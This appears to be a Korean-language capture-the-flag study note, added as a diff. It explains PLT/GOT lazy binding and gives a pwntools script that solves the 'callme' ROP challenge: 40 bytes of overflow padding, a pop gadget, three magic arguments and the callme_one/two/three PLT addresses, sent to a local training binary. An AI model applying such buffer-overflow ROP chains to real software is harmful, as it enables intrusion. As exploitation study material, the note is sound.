@@ -1,0 +1,32 @@
+이건 좀 쉽네. PLT함수의 정의가 무엇인지 알고, 하드코딩했었던 함수의 주소를 linker에게 맡기는 구조.
+lazy binding때문에 plt함수는 pwntools를 사용해 elf의 plt주소를 빼오기만 하면 linker가 실행하기 전에 저절로 got에서 주소를 찾아서 가져온다.
+
+PLT는 Procedure Linkage Table.
+jmp[callme_one@got] 하고
+처음 호출이면 GOT에 함수 주소가 없기 때문에 linker에 점프해서 lazy binding수행. 따라서 libc에서 실제 주소 가져와 GOT에 저장.
+이제 GOT에 들었으니 jump!!
+
+결국
+plt주소만 넣어서 ROP chain만 구성하면 되는것.
+
+from pwn import *
+context.bits = 64
+
+pwn = b'A'*40
+
+elf = ELF('./callme')
+one_got =p64(elf.plt['callme_one'])
+two_got = p64(elf.plt['callme_two'])
+three_got = p64(elf.plt['callme_three'])
+
+args1 = p64(0xdeadbeefdeadbeef)
+args2 = p64(0xcafebabecafebabe)
+args3 = p64(0xd00df00dd00df00d)
+
+usefulGadget = p64(0x40093c)
+
+payload= pwn+usefulGadget + args1+args2+args3+one_got+usefulGadget + args1+args2+args3+two_got+usefulGadget + args1+args2+args3+three_got
+
+p=process('./callme')
+p.send(payload)
+p.interactive()
